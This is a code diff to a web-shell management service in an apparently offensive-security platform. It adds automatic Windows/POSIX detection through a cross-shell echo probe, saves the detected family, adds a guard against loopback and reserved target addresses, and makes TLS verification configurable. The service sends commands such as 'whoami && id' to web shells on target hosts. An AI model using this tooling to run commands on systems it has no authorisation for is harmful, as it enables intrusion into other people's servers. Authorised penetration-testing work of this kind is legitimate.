@@ -2,9 +2,11 @@ from __future__ import annotations
 
 import base64
 import binascii
+import ipaddress
 import re
+import socket
 import time
-from urllib.parse import quote
+from urllib.parse import quote, urlsplit
 
 import httpx
 from sqlalchemy import Engine
@@ -28,6 +30,10 @@ from axiom.shared.errors import ConflictError, NotFoundError
 
 
 _CANARY = {"posix": "whoami && id && pwd", "windows": "whoami & cd"}
+# 跨 shell 探针：cmd 展开 %OS%，PowerShell 展开 $env:OS，sh 只展开 $(...)
+_PROBE = "echo AXIOM_%OS%_$env:OS_$(echo posix)"
+_PROBE_MARK = "AXIOM_"
+_PROBE_WINDOWS_MARK = "Windows_NT"
 
 
 def _shq(value: str) -> str:
@@ -124,6 +130,7 @@ class WebShellService:
         with self.engine.connect() as conn:
             self._require_task(conn, task_id)
             connection = self._require_connection(conn, task_id, connection_id)
+        connection = self._resolve_family(task_id, connection)
         command = self._file_command(connection, body)
         result = self._run(task_id, connection_id, command, actor=actor, intent_id=intent_id)
         if body.op == "read" and connection.family == "posix" and result.ok:
@@ -164,9 +171,19 @@ class WebShellService:
             connection = self._require_connection(conn, task_id, connection_id)
             if connection.archived:
                 raise ConflictError(f"Archived WebShell cannot be used: {connection_id}")
-        effective = command if command is not None else _CANARY[connection.family]
         started = time.monotonic()
-        ok, output, error = self._request(connection, effective, timeout_seconds)
+        if canary and connection.family == "auto":
+            detected, (ok, output, error) = self._detect_family(connection, timeout_seconds)
+            if detected is None and not ok:
+                effective = _PROBE
+            else:
+                if detected is not None:
+                    self._persist_family(task_id, connection_id, detected)
+                effective = _CANARY[detected or "posix"]
+                ok, output, error = self._request(connection, effective, timeout_seconds)
+        else:
+            effective = command if command is not None else _CANARY[connection.family]
+            ok, output, error = self._request(connection, effective, timeout_seconds)
         duration_ms = int((time.monotonic() - started) * 1000)
         checked_at = utcnow()
         status_update = {
@@ -200,6 +217,29 @@ class WebShellService:
             checked_at=checked_at,
         )
 
+    def _resolve_family(self, task_id: str, connection: WebShellConnection) -> WebShellConnection:
+        if connection.family != "auto":
+            return connection
+        detected, _ = self._detect_family(connection, timeout_seconds=30)
+        if detected is None:
+            raise ConflictError("无法自动判定目标系统（posix/windows），请在连接配置里手动选择")
+        self._persist_family(task_id, connection.id, detected)
+        return connection.model_copy(update={"family": detected})
+
+    def _persist_family(self, task_id: str, connection_id: str, family: str) -> None:
+        with transaction(self.engine) as conn:
+            self.repository.update(conn, task_id, connection_id, {"family": family}, now=utcnow())
+
+    @staticmethod
+    def _detect_family(
+        connection: WebShellConnection, timeout_seconds: int
+    ) -> tuple[str | None, tuple[bool, str, str]]:
+        outcome = WebShellService._request(connection, _PROBE, timeout_seconds)
+        ok, output, _ = outcome
+        if not ok or _PROBE_MARK not in output:
+            return None, outcome
+        return ("windows" if _PROBE_WINDOWS_MARK in output else "posix"), outcome
+
     @staticmethod
     def _request(connection: WebShellConnection, command: str, timeout_seconds: int) -> tuple[bool, str, str]:
         request = connection.request
@@ -212,8 +252,9 @@ class WebShellService:
             joined = request.query.replace(CMD_PLACEHOLDER, encoded)
             url = f"{url}{'&' if '?' in url else '?'}{joined}"
         body = request.body.replace(CMD_PLACEHOLDER, encoded) if request.body else ""
+        WebShellService._assert_safe_target(url)
         try:
-            with httpx.Client(timeout=timeout_seconds, verify=False, trust_env=False) as client:
+            with httpx.Client(timeout=timeout_seconds, verify=request.verify_tls, trust_env=False) as client:
                 response = client.request(
                     request.method,
                     url,
@@ -226,6 +267,24 @@ class WebShellService:
         output, extracted = WebShellService._extract(text, connection.response)
         ok = response.status_code == 200 and extracted
         return ok, output, "" if ok else f"HTTP {response.status_code}" + ("" if extracted else "：响应提取失败")
+
+    @staticmethod
+    def _assert_safe_target(url: str) -> None:
+        host = urlsplit(url).hostname
+        if not host:
+            raise ConflictError("WebShell URL 缺少主机")
+        try:
+            infos = socket.getaddrinfo(host, None, type=socket.SOCK_STREAM)
+        except OSError as exc:
+            raise ConflictError(f"无法解析 WebShell 目标：{exc}") from exc
+        for info in infos:
+            try:
+                ip = ipaddress.ip_address(info[4][0])
+            except ValueError:
+                continue
+            if (ip.is_loopback or ip.is_link_local or ip.is_multicast
+                    or ip.is_unspecified or ip.is_reserved):
+                raise ConflictError("WebShell 目标地址指向本机/链路本地/保留地址，已拒绝")
 
     @staticmethod
     def _extract(text: str, template: WebShellResponseTemplate) -> tuple[str, bool]:
